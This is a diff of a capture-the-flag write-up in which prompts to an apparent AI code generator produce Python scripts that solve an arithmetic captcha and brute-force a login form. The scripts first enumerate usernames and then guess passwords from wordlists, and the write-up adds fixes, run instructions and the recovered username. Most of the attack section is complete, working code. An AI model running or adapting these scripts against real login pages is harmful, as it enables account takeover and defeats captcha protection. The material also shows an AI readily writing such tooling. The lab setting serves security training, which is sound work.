@@ -88,8 +88,9 @@ def solve_captcha(response_text: str) -> int:
 Great! We have a method that can parse and calculate the mathematical Captcha.
 
 
-Use the function above in a program that connects to http://victimip/login and POSTs username and password in this format "username=user1&password=pwd" until the response does not contain "does not exist". If the response contains "Invalid captcha" read the captcha from the response, calculate the value and POST again with format "username=user1&password=pwd&captcha=theCaptcha"
+``prompt > Use the function above in a program that connects to http://serverip/login and POSTs username and password in this format "username=user1&password=pwd" until the response does not contain "does not exist". If the response contains "Invalid captcha" read the captcha from the response, calculate the value and POST again with format "username=user1&password=pwd&captcha=theCaptcha" ``
 
+```
 import requests
 
 url = 'http://serverip/login'
@@ -109,10 +110,11 @@ while True:
         response_text = response.text
         if 'does not exist' not in response_text:
             break
-            
+```         
             
 prompt > read username from a file called usernames.txt and use these in the loop to test usernames
 
+```
 import requests
 
 url = 'http://serverip/login'
@@ -136,5 +138,143 @@ for username in usernames:
         if 'does not exist' not in response_text:
             print(f'Successful login with username: {username}')
             break
+```
 
+OK, this codeis almost right. We just have to add ``and 'Invalid captcha' not in response_text:`` to the first if-statement. 
+The last print-statement should read ``print(f'Valid username: {username} found') ``
+
+So the complete code go brute force the username should look like this:
+
+```
+import requests
+import re
+
+def solve_captcha(response_text: str) -> int:
+    match = re.search(r'(\d+)\s*([\+\-\*\/])\s*(\d+)\s*=\s*\?', response_text)
+    if match:
+        a = int(match.group(1))
+        operator = match.group(2)
+        b = int(match.group(3))
+        if operator == '+':
+            return a + b
+        elif operator == '-':
+            return a - b
+        elif operator == '*':
+            return a * b
+        elif operator == '/':
+            return a / b
+    return None
+
+url = 'http://serverip/login'
+password = 'pwd'
+
+with open('usernames.txt', 'r') as f:
+    usernames = f.read().splitlines()
+
+for username in usernames:
+    data = {'username': username, 'password': password}
+    response = requests.post(url, data=data)
+    response_text = response.text
+    if 'does not exist' not in response_text and 'Invalid captcha' not in response_text:
+        print(f'Successful login with username: {username}')
+        break
+    if 'Invalid captcha' in response_text:
+        captcha_value = solve_captcha(response_text)
+        data['captcha'] = captcha_value
+        response = requests.post(url, data=data)
+        response_text = response.text
+        if 'does not exist' not in response_text:
+            print(f'Successful login with username: {username}')
+            break
+```
+You need to change she ``serverip``, and perhaps also the path to the ``usernames.txt`` file.
+
+Save this code as bf_username.py and run with python bf_username.py 
+This will give us the username: natalie after a couple of minutes of execution.
+
+## Get the wrong password respose
+Go back to the web page and manually enter natalie as username and something as password. We need to do this to see whats the page returns on wrong password.
+
+![image](https://user-images.githubusercontent.com/6702854/236632504-dc9674c8-bc76-4456-9e84-28de8195fe26.png)
+
+We see that the response contains the string "Invalid password for user". 
+
+prompt > change the program to use the username "natalie" and read the passwords from a file passwords.txt. Try the passwords until the response does not contain "Invalid password for user", instead of "does not exist"
+
+```
+import requests
+
+url = 'http://serverip/login'
+username = 'natalie'
+
+with open('passwords.txt', 'r') as f:
+    passwords = f.read().splitlines()
+
+for password in passwords:
+    data = {'username': username, 'password': password}
+    response = requests.post(url, data=data)
+    response_text = response.text
+    if 'Invalid password for user' not in response_text:
+        print(f'Successful login with password: {password}')
+        break
+    if 'Invalid captcha' in response_text:
+        captcha_value = solve_captcha(response_text)
+        data['captcha'] = captcha_value
+        response = requests.post(url, data=data)
+        response_text = response.text
+        if 'Invalid password for user' not in response_text:
+            print(f'Successful login with password: {password}')
+            break
+```
+
+As before, the code is not perfekt, but if we add and 'Invalid captcha' not in response_text: to the first if-statement we are good to go.
+The complete code looks like this:
+
+```
+import requests
+import re
+
+def solve_captcha(response_text: str) -> int:
+    match = re.search(r'(\d+)\s*([\+\-\*\/])\s*(\d+)\s*=\s*\?', response_text)
+    if match:
+        a = int(match.group(1))
+        operator = match.group(2)
+        b = int(match.group(3))
+        if operator == '+':
+            return a + b
+        elif operator == '-':
+            return a - b
+        elif operator == '*':
+            return a * b
+        elif operator == '/':
+            return a / b
+    return None
+
+url = 'http://serverip/login'
+username = 'natalie'
+
+with open('passwords.txt', 'r') as f:
+    passwords = f.read().splitlines()
+
+for password in passwords:
+    data = {'username': username, 'password': password}
+    response = requests.post(url, data=data)
+    response_text = response.text
+    if 'Invalid password for user' not in response_text and 'Invalid captcha' not in response_text:
+        print(f'Successful login with password: {password}')
+        break
+    if 'Invalid captcha' in response_text:
+        captcha_value = solve_captcha(response_text)
+        data['captcha'] = captcha_value
+        response = requests.post(url, data=data)
+        response_text = response.text
+        if 'Invalid password for user' not in response_text:
+            print(f'Successful login with password: {password}')
+            break
+```
+
+Save the code in a file like bf_password.py and run it with python bf_password.py.
+After a couple of minutes you have the password.
+
+Use the username and password to log in manually through the web page and get your well deserved flag!
 
